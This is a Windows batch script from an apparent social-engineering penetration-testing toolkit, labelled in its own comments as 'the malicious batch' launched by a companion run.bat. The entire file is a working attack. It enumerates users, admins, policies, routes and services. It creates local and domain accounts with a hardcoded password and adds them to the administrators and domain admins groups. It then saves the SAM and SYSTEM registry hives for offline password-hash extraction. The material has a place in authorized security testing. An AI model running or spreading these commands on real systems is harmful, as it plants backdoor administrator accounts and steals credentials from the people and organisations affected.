@ECHO OFF
REM soc-eng-batches (framework.cmd)
REM 8/21/2015 by Ted R (http://github.com/actuated)
REM This is the malicious batch, called by ../run.bat
REM Save this batch as drivers/framework.cmd, relative to run.bat
REM 1/1/2016 Aesthetic changes

REM This variable lets the script know where it is located and saving files to.
for /f %%i in ("%0") do set strPATH2=%%~dpi

REM These variables will be used to set the usernames and password, when attempting to create local and domain users/admins.
set strLOCALUSER=mylocaluser
set strDOMUSER=mydomainuser
set strMYPASS=hUpAy29X

ECHO %date% %time%
ECHO.

ECHO *** Get username:
whoami
ECHO.

ECHO *** Get password policy and lockout info:
net accounts
ECHO.

ECHO *** Attempt to create local user:
net user /add %strLOCALUSER% %strMYPASS%
ECHO.

ECHO *** Attempt to make local user a local admin:
net localgroup /add administrators %strLOCALUSER%

ECHO *** Get local users:
net user
ECHO.

ECHO *** Get local admins:
net localgroup administrators
ECHO.

ECHO *** Attempt to create domain user:
net user /add %strDOMUSER% %strMYPASS% /domain
ECHO.

ECHO *** Attempt to make domain user a domain admin:
net group /add "domain admins" %strDOMUSER% /domain
ECHO.

ECHO *** Get domain users
net user /domain
ECHO.

ECHO *** Get domain admins:
net group "domain admins" /domain
ECHO.

ECHO *** Get gpresults
gpresult /z
ECHO.

ECHO *** Get routes
route print
ECHO.

ECHO *** Get services
net start
ECHO.

ECHO *** Attempt to get SYSTEM and SAM files:
reg save hklm\system %strPATH2%%computername%-system.dat
reg save hklm\sam %strPATH2%%computername%-sam.dat

ECHO.

EXIT
